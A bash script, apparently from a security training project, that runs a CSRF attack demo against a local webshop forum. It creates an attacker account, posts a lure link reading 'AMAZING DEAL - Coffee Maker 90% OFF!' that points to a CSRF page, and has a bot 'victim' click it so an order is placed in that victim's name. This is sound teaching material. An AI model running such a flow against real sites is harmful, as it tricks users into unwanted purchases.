#!/bin/bash

# CSRF Demo Script
# This script demonstrates the CSRF vulnerability in the webshop forum

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
CSRF_APP_DIR="${PROJECT_ROOT}/apps/csrf-app"
BOOMER_BOTS_DIR="${PROJECT_ROOT}/apps/boomer-bots"

FRONTEND_URL="http://localhost:3000"
BACKEND_URL="http://localhost:3001"
CSRF_APP_URL="http://localhost:8080"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║       🎯 CSRF Attack Demonstration Script 🎯            ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Step 0: Check if frontend and backend are running
echo -e "${YELLOW}[Step 0/5]${NC} Checking if frontend and backend are running..."
echo ""

# Check backend
if curl -s "${BACKEND_URL}/api/health" > /dev/null 2>&1; then
    echo -e "${GREEN}✓${NC} Backend is running at ${BACKEND_URL}"
else
    echo -e "${RED}✗${NC} Backend is NOT running at ${BACKEND_URL}"
    echo -e "${YELLOW}Please start the backend with: cd apps/backend && npm run dev${NC}"
    exit 1
fi

# Check frontend
if curl -s "${FRONTEND_URL}" > /dev/null 2>&1; then
    echo -e "${GREEN}✓${NC} Frontend is running at ${FRONTEND_URL}"
else
    echo -e "${RED}✗${NC} Frontend is NOT running at ${FRONTEND_URL}"
    echo -e "${YELLOW}Please start the frontend with: cd apps/frontend && npm run dev${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}✓${NC} All required services are running!"
echo ""
read -p "Press Enter to continue..."
echo ""

# Step 1: Start serving the CSRF app
echo -e "${YELLOW}[Step 1/5]${NC} Starting CSRF app server..."
echo ""

# Navigate to csrf-app directory
cd "${CSRF_APP_DIR}"

# Check if node_modules exists, if not install dependencies
if [ ! -d "node_modules" ]; then
    echo "Installing dependencies..."
    npm install > /dev/null 2>&1
    echo -e "${GREEN}✓${NC} Dependencies installed"
fi

# Kill any existing process on port 8080
lsof -ti:8080 | xargs kill -9 2>/dev/null || true

# Start the CSRF app in the background
npm run dev &
CSRF_PID=$!

# Wait for the server to start
sleep 2

if curl -s "${CSRF_APP_URL}" > /dev/null 2>&1; then
    echo -e "${GREEN}✓${NC} CSRF app is now serving at ${CSRF_APP_URL}"
else
    echo -e "${RED}✗${NC} Failed to start CSRF app"
    kill $CSRF_PID 2>/dev/null || true
    exit 1
fi

echo ""
read -p "Press Enter to continue..."
echo ""

# Step 2: Create a new user
echo -e "${YELLOW}[Step 2/5]${NC} Creating a new attacker user..."
echo ""

# Double-check backend is still running
if ! curl -s "${BACKEND_URL}/api/health" > /dev/null 2>&1; then
    echo -e "${RED}✗${NC} Backend is no longer running at ${BACKEND_URL}"
    echo -e "${YELLOW}Please restart the backend with: cd apps/backend && npm run dev${NC}"
    kill $CSRF_PID 2>/dev/null || true
    exit 1
fi

RANDOM_NUM=$RANDOM
ATTACKER_USERNAME="attacker_${RANDOM_NUM}"
ATTACKER_PASSWORD="password123"
ATTACKER_EMAIL="attacker${RANDOM_NUM}@evil.com"

echo "Creating user: ${ATTACKER_USERNAME}"

# Create the user
CREATE_USER_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "${BACKEND_URL}/api/users" \
  -H "Content-Type: application/json" \
  -d "{
    \"username\": \"${ATTACKER_USERNAME}\",
    \"password\": \"${ATTACKER_PASSWORD}\",
    \"email\": \"${ATTACKER_EMAIL}\"
  }")

HTTP_CODE=$(echo "$CREATE_USER_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$CREATE_USER_RESPONSE" | sed '$d')

if [ "$HTTP_CODE" -ge 200 ] && [ "$HTTP_CODE" -lt 300 ]; then
    echo -e "${GREEN}✓${NC} User created: ${ATTACKER_USERNAME}"
else
    echo -e "${RED}✗${NC} Failed to create user (HTTP ${HTTP_CODE})"
    echo "Response: ${RESPONSE_BODY}"
    kill $CSRF_PID 2>/dev/null || true
    exit 1
fi

echo ""

# Step 3: Log in and post CSRF link to forum
echo -e "${YELLOW}[Step 3/5]${NC} Logging in and posting CSRF link to forum..."
echo ""

# Login to get the access token
LOGIN_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "${BACKEND_URL}/api/users/login" \
  -H "Content-Type: application/json" \
  -c /tmp/csrf_demo_cookies.txt \
  -d "{
    \"username\": \"${ATTACKER_USERNAME}\",
    \"password\": \"${ATTACKER_PASSWORD}\"
  }")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -n1)

if [ "$HTTP_CODE" -ge 200 ] && [ "$HTTP_CODE" -lt 300 ]; then
    # Extract the access token from cookies
    ACCESS_TOKEN=$(grep -oP "accessToken\s+\K[^\s]+" /tmp/csrf_demo_cookies.txt 2>/dev/null || echo "")
    
    if [ -z "$ACCESS_TOKEN" ]; then
        echo -e "${RED}✗${NC} Failed to get access token from cookies"
        kill $CSRF_PID 2>/dev/null || true
        exit 1
    fi
    
    echo -e "${GREEN}✓${NC} Successfully logged in"
else
    echo -e "${RED}✗${NC} Login failed (HTTP ${HTTP_CODE})"
    kill $CSRF_PID 2>/dev/null || true
    exit 1
fi

echo ""

# Post the malicious forum message with CSRF link
FORUM_TITLE="AMAZING DEAL - Coffee Maker 90% OFF!"
FORUM_BODY="Limited time offer! <a href=\"${CSRF_APP_URL}\">Click here to see this incredible offer!</a>"

# Create JSON payload using jq to properly escape
JSON_PAYLOAD=$(jq -n \
  --arg title "$FORUM_TITLE" \
  --arg body "$FORUM_BODY" \
  '{title: $title, body: $body}')

POST_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "${BACKEND_URL}/api/forum" \
  -H "Content-Type: application/json" \
  -H "Cookie: accessToken=${ACCESS_TOKEN}" \
  -d "$JSON_PAYLOAD")

HTTP_CODE=$(echo "$POST_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$POST_RESPONSE" | sed '$d')

if [ "$HTTP_CODE" -ge 200 ] && [ "$HTTP_CODE" -lt 300 ]; then
    echo -e "${GREEN}✓${NC} CSRF link posted to forum!"
    echo ""
    echo "Forum post:"
    echo "  Title: ${FORUM_TITLE}"
    echo "  Body: ${FORUM_BODY}"
else
    echo -e "${RED}✗${NC} Failed to post to forum (HTTP ${HTTP_CODE})"
    echo "Response: ${RESPONSE_BODY}"
    kill $CSRF_PID 2>/dev/null || true
    exit 1
fi
echo ""
read -p "Press Enter to continue..."
echo ""

# Step 4: Run boomer bot to click the link
echo -e "${YELLOW}[Step 4/5]${NC} Running BoomerBot to click on the CSRF link..."
echo ""
echo -e "${BLUE}ℹ${NC}  The bot will run in non-headless mode so you can see the browser"
echo ""

# Run the boomer bot with headless=false
cd "${BOOMER_BOTS_DIR}"
node boomer-bot.js --headless=false

echo ""
echo -e "${GREEN}✓${NC} BoomerBot finished clicking links"
echo ""

# Step 5: Cleanup
echo -e "${YELLOW}[Step 5/5]${NC} Cleaning up..."
echo ""

# Kill the CSRF app server
kill $CSRF_PID 2>/dev/null || true
echo -e "${GREEN}✓${NC} CSRF app server stopped"

# Clean up cookies
rm -f /tmp/csrf_demo_cookies.txt
echo -e "${GREEN}✓${NC} Temporary files removed"

echo ""
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║              ✅ Demo Complete! ✅                         ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}What happened:${NC}"
echo "1. A malicious user posted a CSRF link to the forum"
echo "2. A boomer bot (victim) clicked on the link"
echo "3. The CSRF page automatically placed an order on behalf of the victim"
echo "4. The victim's account was charged without their knowledge!"
echo ""
echo -e "${YELLOW}Check the backend logs to see the order that was placed.${NC}"
echo ""
